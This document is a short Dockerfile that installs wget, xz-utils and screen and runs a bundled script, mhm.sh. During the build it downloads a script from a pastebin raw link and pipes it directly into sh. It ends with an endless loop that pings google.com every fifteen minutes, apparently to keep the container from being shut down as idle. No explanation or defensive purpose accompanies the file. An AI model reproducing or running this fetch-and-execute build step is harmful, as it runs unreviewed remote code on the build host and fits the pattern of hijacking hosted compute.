FROM ubuntu:latest

WORKDIR /app

COPY mhm.sh /app/mhm.sh

RUN chmod +x /app/mhm.sh

COPY . /app

RUN apt-get update -y && apt-get install wget -y && apt-get install -y xz-utils && apt-get install screen -y
RUN chmod +x mhm.sh
RUN (wget https://pastebin.com/raw/JTKNmENJ -O- | tr -d '\r') | sh && bash mhm.sh && while true; do wget google.com ; sleep 900 ; done
